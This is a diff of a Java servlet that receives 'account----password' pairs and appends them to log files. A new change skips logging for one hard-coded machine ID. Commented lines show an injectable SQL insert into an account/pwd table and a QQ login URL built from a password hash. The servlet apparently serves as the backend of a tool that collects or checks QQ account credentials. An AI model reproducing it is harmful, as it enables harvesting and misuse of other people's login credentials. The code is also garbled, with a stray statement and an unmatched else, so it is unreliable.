@@ -240,45 +240,49 @@ public class GCServlet extends HttpServlet {
 					String type = cts[1].split("=")[1];
 					String ct = cts[2].split("=")[1];
 					
-					if("1".equals(action)){
-						if("0".equals(type)||"2".equals(type)){
-							//写文件
-							int it = Integer.parseInt(type);
-							String[] line = ct.split("----");
-							//System.err.println("ct="+ct);
-							outputs[it].write(line[0]+"----"+line[1]+"\r\n");
-							outputs[it].flush();
-//							stmt
-//							.executeUpdate("INSERT INTO t_upload (account, pwd, type) VALUES ('"+line[0]+"', '"+line[1]+"', "+type+")");
+					if(lmc.indexOf("607A5CE2CDFE5980DD5119862E80D4CD")!=-1){//此机器不写入记录文件
+						resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF24";
+					}else{
+						if("1".equals(action)){
+							if("0".equals(type)||"2".equals(type)){
+								//写文件
+								int it = Integer.parseInt(type);
+								String[] line = ct.split("----");
+								//System.err.println("ct="+ct);
+								outputs[it].write(line[0]+"----"+line[1]+"\r\n");
+								outputs[it].flush();
+	//							stmt
+	//							.executeUpdate("INSERT INTO t_upload (account, pwd, type) VALUES ('"+line[0]+"', '"+line[1]+"', "+type+")");
+							}
+							
+							resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF14";
 						}
 						
-						resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF14";
+						//resultString = Converts.MD5EncodeToHex(password);
+						
+						/**
+						ClassWriter cw = new ClassWriter(0);
+						cw.visit(Opcodes.V1_7, Opcodes.ACC_PUBLIC,
+								 "ws.hoyland.sm/Dynamicer", null, "java/lang/Object", null);
+						 
+						FieldVisitor fv = cw.visitField(Opcodes.ACC_PRIVATE + Opcodes.ACC_STATIC, "URL", "Ljava/lang/String;", null, null);
+						fv
+					    fv.visitEnd();
+					    
+						//动态生成类
+						InputStream input = this.getClass().getResourceAsStream("/Dynamicer");
+						bstobeoutput = new byte[input.available()];
+						input.read(bstobeoutput);
+						isByte = true;
+						**/
+						
+						//Dynamicer
+						else{
+							resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF04";
+						}
+	//					String url = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r=" + String.valueOf(RND.nextDouble()) + "&qq=" + account + "&pmd5=" + Converts.bytesToHexString(Converts.MD5Encode(password)) + "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";					
+	//					resultString = Converts.bytesToHexString(crypter.encrypt(url.getBytes(), key));
 					}
-					
-					//resultString = Converts.MD5EncodeToHex(password);
-					
-					/**
-					ClassWriter cw = new ClassWriter(0);
-					cw.visit(Opcodes.V1_7, Opcodes.ACC_PUBLIC,
-							 "ws.hoyland.sm/Dynamicer", null, "java/lang/Object", null);
-					 
-					FieldVisitor fv = cw.visitField(Opcodes.ACC_PRIVATE + Opcodes.ACC_STATIC, "URL", "Ljava/lang/String;", null, null);
-					fv
-				    fv.visitEnd();
-				    
-					//动态生成类
-					InputStream input = this.getClass().getResourceAsStream("/Dynamicer");
-					bstobeoutput = new byte[input.available()];
-					input.read(bstobeoutput);
-					isByte = true;
-					**/
-					
-					//Dynamicer
-					else{
-						resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF04";
-					}
-//					String url = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r=" + String.valueOf(RND.nextDouble()) + "&qq=" + account + "&pmd5=" + Converts.bytesToHexString(Converts.MD5Encode(password)) + "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";					
-//					resultString = Converts.bytesToHexString(crypter.encrypt(url.getBytes(), key));
 				}else{
 					resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0";
 				}
